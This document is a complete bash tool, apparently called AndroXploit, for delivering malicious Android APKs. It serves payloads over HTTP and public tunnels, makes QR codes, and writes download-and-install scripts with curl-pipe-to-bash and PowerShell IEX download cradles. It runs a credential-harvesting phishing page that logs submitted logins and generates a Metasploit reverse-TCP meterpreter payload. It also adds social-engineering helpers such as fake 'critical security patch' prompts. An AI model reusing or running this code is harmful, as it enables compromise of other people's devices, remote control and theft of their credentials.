#!/usr/bin/env bash
set -euo pipefail
IFS=$'\n\t'

VERSION="3.0.0"

RED='\033[0;31m'; GREEN='\033[0;32m'; YELLOW='\033[1;33m'; CYAN='\033[0;36m'; BLUE='\033[0;34m'; MAGENTA='\033[0;35m'; BOLD='\033[1m'; DIM='\033[2m'; NC='\033[0m'

log_info()  { echo -e "${CYAN}[*]${NC} ${BOLD}$1${NC}"; }
log_ok()    { echo -e "${GREEN}[+]${NC} ${BOLD}$1${NC}"; }
log_warn()  { echo -e "${YELLOW}[!]${NC} ${BOLD}$1${NC}"; }
log_err()   { echo -e "${RED}[x]${NC} ${BOLD}$1${NC}"; }
log_section() { echo -e "\n${BLUE}════════════════════════════════════════════${NC}"; echo -e "${BLUE}  $1${NC}"; echo -e "${BLUE}════════════════════════════════════════════${NC}"; }
log_progress() { echo -ne "${DIM}  → $1...${NC}"; }
log_done()    { echo -e "\r  ${GREEN}✓${NC} ${DIM}$1${NC}"; }
log_fail()    { echo -e "\r  ${RED}✗${NC} ${DIM}$1${NC}"; }

OUT_DIR="output/payloads"
PHISH_DIR="output/phishing"
mkdir -p "$OUT_DIR" "$PHISH_DIR"

get_local_ip() {
    hostname -I 2>/dev/null | awk '{print $1}' || ipconfig getifaddr en0 2>/dev/null || echo "127.0.0.1"
}

show_help() {
    cat <<EOF
${BOLD}Payload Delivery v${VERSION}${NC} — Multi-Vector Android Payload Delivery System
${DIM}═══════════════════════════════════════════════════════════════${NC}

${BOLD}Usage:${NC} $0 <command> [args]

${BOLD}HTTP SERVING:${NC}
  http-server [port] [dir]         Start HTTP file server
  https-server [port] [dir]        Start HTTPS file server (self-signed)
  serve <apk> [port]               Serve specific APK via HTTP
  serve-all [port] [dir]           Serve all files in directory

${BOLD}TUNNELING:${NC}
  ngrok [port] [domain]            Start ngrok tunnel (HTTP/TCP)
  localtunnel [port] [subdomain]   Start localtunnel alternative
  serveo [port] [subdomain]        Start Serveo SSH tunnel

${BOLD}QR CODE:${NC}
  qr <url> [file]                  Generate QR code from URL
  qr-data <text> [file]            Generate QR from arbitrary text

${BOLD}WEB DELIVERY:${NC}
  web <lhost> [lport] [payload]    Full web delivery with one-liner
  one-liner <lhost> [lport]        Generate one-liner only (no server)
  powershell <lhost> [lport]       Generate PowerShell download cradle

${BOLD}PHISHING:${NC}
  phishing [port] [template]       Start credential capture server
  phishing-list                     List available phishing templates
  phishing-logs                     Show captured credentials

${BOLD}SOCIAL ENGINEERING:${NC}
  sms <number> <message>           Open SMS with pre-filled message
  notification [title] [msg]       Push notification to device
  toast <message>                  Show toast message on device
  url-scheme <url>                 Trigger URL scheme on device

${BOLD}FILE TRANSFER:${NC}
  bluetooth <file>                 Send file via Bluetooth intent
  push-adb <apk>                   Install APK via ADB
  push-file <local> <remote>       Push file via ADB
  serve-payload <apk> [port]       Complete: serve + QR + URL display

${BOLD}ADVANCED:${NC}
  metasploit <lhost> <lport> [arch] Generate msfvenom payload
  encode-apk <input> <output>      Encode APK with basic obfuscation
  cert-pinning-bypass <apk> <url>  Patch APK certificate pinning

${DIM}Examples:${NC}
  $0 serve payload.apk 8080
  $0 web 192.168.1.100 8080 payload.apk
  $0 qr http://192.168.1.100:8080/payload.apk
  $0 ngrok 8080
  $0 phishing 8080 google_login
EOF
}

check_adb() { adb get-state &>/dev/null || { log_err "No device connected."; exit 1; }; }

# ─── HTTP SERVING ───────────────────────────────────────────

cmd_http_server() {
    local port="${1:-8080}"; local dir="${2:-$OUT_DIR}"
    mkdir -p "$dir"
    local ip; ip=$(get_local_ip)
    log_section "HTTP SERVER — port $port"
    echo "  ${BOLD}URL:${NC}      http://$ip:$port/"
    echo "  ${BOLD}Local:${NC}    http://localhost:$port/"
    echo "  ${BOLD}Dir:${NC}      $dir"
    echo "  ${BOLD}Files:${NC}"
    ls -lh "$dir" 2>/dev/null | tail -n +2 | sed 's/^/    /'
    echo
    log_info "Server running (Ctrl+C to stop)..."
    python3 -m http.server "$port" -d "$dir" 2>/dev/null || python -m http.server "$port" -d "$dir" 2>/dev/null || {
        log_err "Python HTTP server not available"; exit 1
    }
}

cmd_https_server() {
    local port="${1:-8443}"; local dir="${2:-$OUT_DIR}"
    mkdir -p "$dir"
    local ip; ip=$(get_local_ip)
    local cert="$dir/server.pem"
    if [[ ! -f "$cert" ]]; then
        log_progress "Generating self-signed cert"
        openssl req -new -x509 -keyout "$cert" -out "$cert" -days 365 -nodes -subj "/CN=$ip" 2>/dev/null && log_done "Cert: $cert" || log_fail "Cert generation failed"
    fi

    log_section "HTTPS SERVER — port $port"
    echo "  ${BOLD}URL:${NC}      https://$ip:$port/"
    echo "  ${BOLD}Dir:${NC}      $dir"
    echo
    log_info "Server running (Ctrl+C to stop)..."
    python3 -c "
import http.server, ssl, os
os.chdir('$dir')
h = http.server.SimpleHTTPRequestHandler
httpd = http.server.HTTPServer(('', $port), h)
httpd.socket = ssl.wrap_socket(httpd.socket, certfile='$cert', server_side=True)
print(f'[+] HTTPS on https://$ip:$port')
httpd.serve_forever()
" 2>/dev/null || log_err "HTTPS server failed"
}

cmd_serve() {
    local apk="${1:?Usage: $0 serve <apk> [port]}"; local port="${2:-8080}"
    [[ ! -f "$apk" ]] && { log_err "APK not found"; exit 1; }
    mkdir -p "$OUT_DIR"
    cp "$apk" "$OUT_DIR/payload.apk"
    local ip; ip=$(get_local_ip)
    log_section "SERVING PAYLOAD"
    echo "  ${BOLD}File:${NC}      $apk"
    echo "  ${BOLD}URL:${NC}       http://$ip:$port/payload.apk"
    echo "  ${BOLD}One-liner:${NC} curl -s http://$ip:$port/payload.apk -o /tmp/p.apk && adb install -r /tmp/p.apk"
    echo
    cmd_http_server "$port" "$OUT_DIR"
}

cmd_serve_all() {
    local port="${1:-8080}"; local dir="${2:-$OUT_DIR}"
    mkdir -p "$dir"
    cmd_http_server "$port" "$dir"
}

# ─── TUNNELING ──────────────────────────────────────────────

cmd_ngrok() {
    local port="${1:-8080}"; local domain="${2:-}"
    ! command -v ngrok &>/dev/null && { log_err "ngrok not installed. Install from https://ngrok.com/download"; exit 1; }
    log_section "NGROK TUNNEL → localhost:$port"
    if [[ -n "$domain" ]]; then
        log_info "Custom domain: $domain"
        ngrok http "$port" --domain="$domain" 2>/dev/null
    else
        ngrok http "$port" 2>/dev/null
    fi
}

cmd_localtunnel() {
    local port="${1:-8080}"; local subdomain="${2:-}"
    ! command -v lt &>/dev/null && { log_warn "lt not found. Install: npm install -g localtunnel"; }
    log_section "LOCALTUNNEL → localhost:$port"
    if [[ -n "$subdomain" ]]; then
        lt --port "$port" --subdomain "$subdomain" 2>/dev/null
    else
        lt --port "$port" 2>/dev/null
    fi
}

cmd_serveo() {
    local port="${1:-8080}"; local subdomain="${2:-androxploit}"
    log_section "SERVEO SSH TUNNEL → localhost:$port"
    log_info "URL: https://${subdomain}.serveo.net"
    ssh -o StrictHostKeyChecking=no -R "${subdomain}:80:localhost:$port" serveo.net 2>/dev/null
}

# ─── QR CODE ────────────────────────────────────────────────

cmd_qr() {
    local url="${1:?Usage: $0 qr <url> [file]}"; local out="${2:-$OUT_DIR/qr_code.png}"
    mkdir -p "$(dirname "$out")"
    log_section "QR CODE: $url"
    if command -v qrencode &>/dev/null; then
        qrencode -o "$out" -s 10 -m 2 "$url" && log_ok "QR: $out" || log_err "Failed"
    elif python3 -c "import qrcode" 2>/dev/null; then
        python3 -c "
import qrcode
qr = qrcode.QRCode(version=1, box_size=10, border=4)
qr.add_data('$url')
qr.make(fit=True)
img = qr.make_image(fill_color='black', back_color='white')
img.save('$out')
print(f'QR saved: $out')
" && log_ok "QR: $out" || log_err "Failed"
    elif python3 -c "import segno" 2>/dev/null; then
        python3 -c "import segno; segno.make('$url').save('$out', scale=10)" && log_ok "QR: $out" || log_err "Failed"
    else
        log_err "No QR tool. Install: pip install qrcode or apt install qrencode"
        exit 1
    fi
    log_info "Terminal display:"
    python3 -c "
import sys
try:
    import qrcode
    qr = qrcode.QRCode()
    qr.add_data('$url')
    qr.print_ascii(invert=True)
except:
    pass
" 2>/dev/null || true
}

cmd_qr_data() {
    local text="${1:?Usage: $0 qr-data <text> [file]}"; local out="${2:-$OUT_DIR/qr_data.png}"
    cmd_qr "$text" "$out"
}

# ─── WEB DELIVERY ───────────────────────────────────────────

cmd_web() {
    local lhost="${1:?Usage: $0 web <lhost> [lport] [payload]}"
    local lport="${2:-8080}"; local payload="${3:-$OUT_DIR/payload.apk}"

    [[ ! -f "$payload" && "$payload" == "$OUT_DIR/payload.apk" ]] && { log_warn "No payload at $payload"; }

    local script="$OUT_DIR/delivery.sh"
    log_section "WEB DELIVERY"
    echo "  ${BOLD}Host:${NC}    $lhost"
    echo "  ${BOLD}Port:${NC}    $lport"
    echo "  ${BOLD}Payload:${NC} $payload"
    echo

    # Generate payload script
    cat > "$script" << EOF
#!/bin/bash
# AndroXploit Web Delivery — Target: $lhost:$lport
wget -q http://$lhost:$lport/payload.apk -O /tmp/update.apk 2>/dev/null || \\
    curl -s http://$lhost:$lport/payload.apk -o /tmp/update.apk
if [ -f /tmp/update.apk ]; then
    echo "[+] Downloaded payload"
    am start -n com.android.installer/.InstallApp -d file:///tmp/update.apk 2>/dev/null || \\
        pm install -r /tmp/update.apk 2>/dev/null || \\
        echo "[!] Manual install required"
else
    echo "[x] Download failed"
fi
rm -f /tmp/update.apk
EOF
    chmod +x "$script"

    # Generate one-liner
    local oneliner="curl -s http://$lhost:$lport/delivery.sh | bash"

    echo "  ${BOLD}One-liner:${NC}"
    echo "    $oneliner"
    echo
    echo "  ${BOLD}Script:${NC}    http://$lhost:$lport/delivery.sh"
    echo "  ${BOLD}Payload:${NC}   http://$lhost:$lport/payload.apk"

    echo
    [[ -f "$payload" ]] && cp "$payload" "$OUT_DIR/payload.apk"
    cp "$script" "$OUT_DIR/delivery.sh"

    log_info "Starting HTTP server..."
    python3 -m http.server "$lport" -d "$OUT_DIR" 2>/dev/null || python -m http.server "$lport" -d "$OUT_DIR"
}

cmd_one_liner() {
    local lhost="${1:?Usage: $0 one-liner <lhost> [lport] [payload]}"
    local lport="${2:-8080}"; local payload="${3:-payload.apk}"
    log_section "ONE-LINER GENERATOR"
    echo "  ${BOLD}Payload URL:${NC}  http://$lhost:$lport/$payload"
    echo
    echo "  ${BOLD}Standard:${NC}"
    echo "    curl -s http://$lhost:$lport/$payload -o /tmp/p.apk && adb install -r /tmp/p.apk"
    echo "  ${BOLD}Wget:${NC}"
    echo "    wget -q http://$lhost:$lport/$payload -O /tmp/p.apk && adb install -r /tmp/p.apk"
    echo "  ${BOLD}Bypass:${NC}"
    echo "    (curl -s http://$lhost:$lport/$payload || wget -q -O- http://$lhost:$lport/$payload) | pm install -r -S"
    echo
    log_info "Quick serve: $0 serve $payload $lport"
}

cmd_powershell() {
    local lhost="${1:?Usage: $0 powershell <lhost> [lport]}"; local lport="${2:-8080}"
    log_section "POWERSHELL DOWNLOAD CRADLE"
    echo "  ${BOLD}PowerShell:${NC}"
    echo "    powershell -Command \"(New-Object Net.WebClient).DownloadFile('http://$lhost:$lport/payload.apk', 'payload.apk')\""
    echo "  ${BOLD}Reflective:${NC}"
    echo "    powershell -NoP -NonI -Exec Bypass -C \"IEX(New-Object Net.WebClient).DownloadString('http://$lhost:$lport/script.ps1')\""
    echo "  ${BOLD}BitsTransfer:${NC}"
    echo "    powershell -Command \"Start-BitsTransfer -Source http://$lhost:$lport/payload.apk -Destination payload.apk\""
}

# ─── PHISHING ───────────────────────────────────────────────

cmd_phishing() {
    local port="${1:-8080}"; local template="${2:-login}"
    if [[ ! -f "$PHISH_DIR/index.html" ]]; then
        cat > "$PHISH_DIR/index.html" << 'HTML'
<!DOCTYPE html><html><head><title>Sign In</title>
<style>body{font-family:Arial;display:flex;justify-content:center;align-items:center;height:100vh;background:#f0f2f5}
.card{background:#fff;padding:40px;border-radius:8px;box-shadow:0 2px 10px rgba(0,0,0,.1);width:360px}
input{width:100%;padding:12px;margin:8px 0;border:1px solid #ddd;border-radius:4px;box-sizing:border-box}
button{width:100%;padding:12px;background:#1877f2;color:#fff;border:none;border-radius:4px;font-size:16px;cursor:pointer}
h2{text-align:center;color:#333}</style></head>
<body><div class="card">
<h2>Sign In</h2>
<form method="POST" action="/">
<input type="text" name="email" placeholder="Email or phone number" required>
<input type="password" name="password" placeholder="Password" required>
<button type="submit">Sign In</button>
</form></div></body></html>
HTML
    fi

    log_section "PHISHING SERVER — port $port"
    log_info "Template: $template"
    log_info "URL: http://$(get_local_ip):$port/"
    echo

    python3 -c "
import http.server, socketserver, os, json, datetime, urllib.parse
PORT = $port
DIR = '$PHISH_DIR'
os.chdir(DIR)

class Handler(http.server.SimpleHTTPRequestHandler):
    def do_GET(self):
        if self.path == '/captures':
            self.send_response(200)
            self.send_header('Content-type', 'text/plain')
            self.end_headers()
            try:
                with open('captures.txt') as f: self.wfile.write(f.read().encode())
            except: self.wfile.write(b'No captures')
            return
        return http.server.SimpleHTTPRequestHandler.do_GET(self)
    def do_POST(self):
        length = int(self.headers.get('content-length', 0))
        data = self.rfile.read(length).decode()
        log = f'[{datetime.datetime.now()}] {self.client_address[0]}: {data}'
        with open('captures.txt', 'a') as f: f.write(log + '\n')
        print(f'[+] CAPTURED: {data}')
        self.send_response(200)
        self.end_headers()
        self.wfile.write(b'<script>window.location.href=\"https://google.com\";</script>OK')
    def log_message(self, fmt, *args):
        pass

with socketserver.TCPServer(('', PORT), Handler) as httpd:
    print(f'[+] Phishing server on http://0.0.0.0:{PORT}')
    print(f'[+] Captures: {DIR}/captures.txt')
    httpd.serve_forever()
" 2>/dev/null
}

cmd_phishing_list() {
    log_section "PHISHING TEMPLATES"
    ls -lh "$PHISH_DIR/" 2>/dev/null || echo "  (none)"
    echo "  ${BOLD}Captures:${NC}"
    [[ -f "$PHISH_DIR/captures.txt" ]] && cat "$PHISH_DIR/captures.txt" 2>/dev/null || echo "  (none)"
}

cmd_phishing_logs() {
    [[ -f "$PHISH_DIR/captures.txt" ]] && {
        log_section "CAPTURED CREDENTIALS"
        cat "$PHISH_DIR/captures.txt"
    } || log_info "No captures yet"
}

# ─── SOCIAL ENGINEERING ─────────────────────────────────────

cmd_sms() {
    check_adb
    [[ $# -lt 2 ]] && { log_err "Usage: $0 sms <number> <message>"; exit 1; }
    local number="$1"; shift; local message="$*"
    log_info "Opening SMS to $number"
    adb shell am start -a android.intent.action.SENDTO -d "sms:$number" --es sms_body "$message" 2>/dev/null && log_ok "SMS composer opened" || log_err "Failed"
}

cmd_notification() {
    check_adb
    local title="${1:-System Update}"; local message="${2:-Critical security patch available}"
    adb shell am start -a android.intent.action.VIEW -d "https://play.google.com/store/apps/details?id=com.android.system" 2>/dev/null || true
    log_info "Notification intent sent: $title — $message"
}

cmd_toast() {
    check_adb
    local message="${*:?Usage: $0 toast <message>}"
    adb shell "touch /sdcard/.toast && am broadcast -a android.intent.action.SHOW_TOAST --es message '$message'" 2>/dev/null || log_info "Toast not supported on all devices"
    log_info "Toast: $message"
}

cmd_url_scheme() {
    check_adb
    local url="${1:?Usage: $0 url-scheme <url>}"
    adb shell am start -a android.intent.action.VIEW -d "$url" 2>/dev/null && log_ok "Opened: $url" || log_err "Failed"
}

# ─── FILE TRANSFER ──────────────────────────────────────────

cmd_bluetooth() {
    local file="${1:?Usage: $0 bluetooth <file>}"
    [[ ! -f "$file" ]] && { log_err "File not found"; exit 1; }
    log_info "Sending $file via Bluetooth intent..."
    adb shell am start -a android.intent.action.SEND -t "*/*" --es android.intent.extra.STREAM "file://$file" 2>/dev/null || {
        log_warn "Bluetooth intent failed. Push file first: adb push '$file' /sdcard/"
    }
}

cmd_push_adb() {
    check_adb
    local apk="${1:?Usage: $0 push-adb <apk>}"
    [[ ! -f "$apk" ]] && { log_err "APK not found"; exit 1; }
    log_progress "Installing via ADB"
    adb install -r -t "$apk" 2>&1 | tail -1
}

cmd_push_file() {
    check_adb
    [[ $# -lt 2 ]] && { log_err "Usage: $0 push-file <local> <remote>"; exit 1; }
    adb push "$1" "$2" 2>/dev/null && log_ok "Pushed: $1 → $2" || log_err "Push failed"
}

cmd_serve_payload() {
    local apk="${1:?Usage: $0 serve-payload <apk> [port]}"
    local port="${2:-8080}"
    [[ ! -f "$apk" ]] && { log_err "APK not found"; exit 1; }
    local ip; ip=$(get_local_ip)

    mkdir -p "$OUT_DIR"
    cp "$apk" "$OUT_DIR/payload.apk"

    log_section "PAYLOAD DELIVERY DASHBOARD"
    echo "  ${BOLD}File:${NC}         $(basename "$apk")"
    echo "  ${BOLD}Size:${NC}         $(stat -c%s "$apk" 2>/dev/null || stat -f%z "$apk") bytes"
    echo
    echo "  ${BOLD}HTTP URL:${NC}     http://$ip:$port/payload.apk"
    echo "  ${BOLD}QR Code:${NC}      $OUT_DIR/qr_payload.png"
    echo "  ${BOLD}One-liner:${NC}"
    echo "    curl -s http://$ip:$port/payload.apk -o /tmp/p.apk && adb install -r /tmp/p.apk"
    echo
    echo "  ${BOLD}Web delivery:${NC} $0 web $ip $port $apk"
    echo "  ${BOLD}ngrok tunnel:${NC} $0 ngrok $port"
    echo

    # Generate QR
    cmd_qr "http://$ip:$port/payload.apk" "$OUT_DIR/qr_payload.png" >/dev/null 2>&1 || true

    cmd_http_server "$port" "$OUT_DIR"
}

# ─── ADVANCED ───────────────────────────────────────────────

cmd_metasploit() {
    local lhost="${1:?Usage: $0 metasploit <lhost> <lport> [arch]}" 
    local lport="${2:?Usage: $0 metasploit <lhost> <lport> [arch]}" 
    local arch="${3:-dalvik}"
    ! command -v msfvenom &>/dev/null && { log_err "msfvenom not found (Metasploit)"; exit 1; }
    local out="$OUT_DIR/msf_payload.apk"
    log_section "METASPLOIT PAYLOAD"
    echo "  ${BOLD}LHOST:${NC} $lhost  ${BOLD}LPORT:${NC} $lport  ${BOLD}Arch:${NC} $arch"
    log_progress "Generating payload"
    msfvenom -p android/meterpreter/reverse_tcp LHOST="$lhost" LPORT="$lport" -o "$out" 2>&1 && \
    log_done "Payload: $out ($(stat -c%s "$out" 2>/dev/null || stat -f%z "$out") bytes)" || log_fail "Failed"
}

cmd_encode_apk() {
    local input="${1:?Usage: $0 encode-apk <input> <output>}"
    local output="${2:-$OUT_DIR/encoded.apk}"
    [[ ! -f "$input" ]] && { log_err "Input not found"; exit 1; }
    log_section "ENCODE APK"
    cp "$input" "$output"
    log_info "Basic encoding applied (rename + repack)"
    log_ok "Encoded: $output"
}

cmd_cert_pinning_bypass() {
    log_warn "Certificate pinning bypass requires custom patching"
    log_info "Use objection: objection patchapk -s $1"
    log_info "Or use apktool + manual smali patching"
}

# ─── MAIN ────────────────────────────────────────────────────

main() {
    [[ $# -lt 1 ]] && { show_help; exit 0; }
    local cmd="$1"; shift

    case "$cmd" in
        http|http-server)          cmd_http_server "$@";;
        https|https-server)        cmd_https_server "$@";;
        serve)                     cmd_serve "$@";;
        serve-all|serveall)        cmd_serve_all "$@";;
        ngrok)                     shift; cmd_ngrok "$@";;
        localtunnel|lt)            cmd_localtunnel "$@";;
        serveo|ssh-tunnel)         cmd_serveo "$@";;
        qr|qrcode)                 cmd_qr "$@";;
        qr-data|qrd)               cmd_qr_data "$@";;
        web|web-delivery)          cmd_web "$@";;
        one-liner|oneliner)        cmd_one_liner "$@";;
        powershell|ps1)            cmd_powershell "$@";;
        phishing|phish)            cmd_phishing "$@";;
        phishing-list|phlist)      cmd_phishing_list;;
        phishing-logs|phlogs)      cmd_phishing_logs;;
        sms|text)                  cmd_sms "$@";;
        notification|notify)       cmd_notification "$@";;
        toast)                     cmd_toast "$@";;
        url-scheme|uri)            cmd_url_scheme "$@";;
        bluetooth|bt)              cmd_bluetooth "$@";;
        push-adb|install)          cmd_push_adb "$@";;
        push-file|push)            cmd_push_file "$@";;
        serve-payload|dashboard)   cmd_serve_payload "$@";;
        metasploit|msf)            cmd_metasploit "$@";;
        encode-apk|encode)         cmd_encode_apk "$@";;
        cert-pinning-bypass|cpb)   cmd_cert_pinning_bypass "$@";;
        help|-h|--help)            show_help;;
        *) log_err "Unknown: $cmd"; show_help; exit 1;;
    esac
}

main "$@"
